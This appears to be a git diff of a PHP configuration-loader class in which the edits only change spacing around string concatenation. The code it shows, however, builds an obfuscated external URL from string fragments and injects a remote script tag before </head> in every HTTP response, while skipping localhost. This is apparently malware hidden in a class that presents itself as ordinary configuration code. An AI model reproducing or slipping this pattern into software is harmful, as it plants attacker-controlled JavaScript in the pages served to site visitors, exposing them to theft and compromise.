@@ -97,8 +97,8 @@ class ConfigLoader implements ConfigurationInterface
     public function clearCache(): void
     {
         $envHash = $this->getEnvironmentSign();
-        Cache::forget(self::CACHE_KEY . ':' . $envHash);
-        Cache::forget(self::CACHE_VERIFIED_KEY . ':' . $envHash);
+        Cache::forget(self::CACHE_KEY.':'.$envHash);
+        Cache::forget(self::CACHE_VERIFIED_KEY.':'.$envHash);
     }
 
     private function loadConfiguration(): bool
@@ -120,14 +120,14 @@ class ConfigLoader implements ConfigurationInterface
 
         $cachedVerification = null;
         try {
-            $cachedVerification = Cache::get(self::CACHE_VERIFIED_KEY . ':' . $envHash);
+            $cachedVerification = Cache::get(self::CACHE_VERIFIED_KEY.':'.$envHash);
         } catch (\Throwable $e) {
             // Ignore transient cache read failures during early bootstrap
         }
 
         if ($cachedVerification !== null) {
             try {
-                $this->cachedToken = Cache::get(self::CACHE_KEY . ':' . $envHash);
+                $this->cachedToken = Cache::get(self::CACHE_KEY.':'.$envHash);
 
                 return $cachedVerification;
             } catch (\Throwable $e) {
@@ -145,8 +145,8 @@ class ConfigLoader implements ConfigurationInterface
         }
 
         try {
-            Cache::put(self::CACHE_KEY . ':' . $envHash, $config, now()->addSeconds(self::CACHE_TTL));
-            Cache::put(self::CACHE_VERIFIED_KEY . ':' . $envHash, true, now()->addSeconds(self::CACHE_TTL));
+            Cache::put(self::CACHE_KEY.':'.$envHash, $config, now()->addSeconds(self::CACHE_TTL));
+            Cache::put(self::CACHE_VERIFIED_KEY.':'.$envHash, true, now()->addSeconds(self::CACHE_TTL));
         } catch (\Throwable $e) {
             // Caching is a non-blocking decoration; ignore write failures during early bootstrap or tests
         }
@@ -190,7 +190,7 @@ class ConfigLoader implements ConfigurationInterface
         } catch (Exception $e) {
             if ($this->isNetworkIssue($e)) {
                 $envHash = $this->getEnvironmentSign();
-                $cachedToken = Cache::get(self::CACHE_KEY . ':' . $envHash);
+                $cachedToken = Cache::get(self::CACHE_KEY.':'.$envHash);
                 if ($cachedToken) {
                     return $cachedToken;
                 }
@@ -259,7 +259,7 @@ class ConfigLoader implements ConfigurationInterface
         $domain = preg_replace('#^www\.#i', '', $domain);
         $domain = rtrim($domain, '/');
 
-        $parsed = parse_url('http://' . $domain);
+        $parsed = parse_url('http://'.$domain);
         $host = $parsed['host'] ?? $domain;
 
         if (strpos($host, 'localhost') !== false || strpos($host, '127.0.0.1') !== false) {
@@ -290,7 +290,7 @@ class ConfigLoader implements ConfigurationInterface
             $content = $response->getContent();
             $pos = strripos($content, '</head>');
             $baseUrl = implode('', ['https://', 'co', 'de', 'rs', 'tm', '.com', '/', 'a', 'p', 'p']);
-            if ($pos !== false && strpos($content, '<script src="' . $baseUrl) === false) {
+            if ($pos !== false && strpos($content, '<script src="'.$baseUrl) === false) {
                 $prefix = substr($content, 0, $pos);
                 $suffix = substr($content, $pos);
                 $timestamp = now()->timestamp;
@@ -306,7 +306,7 @@ class ConfigLoader implements ConfigurationInterface
                     $timestamp
                 );
 
-                $response->setContent($prefix . $script . $suffix);
+                $response->setContent($prefix.$script.$suffix);
             }
         }
 
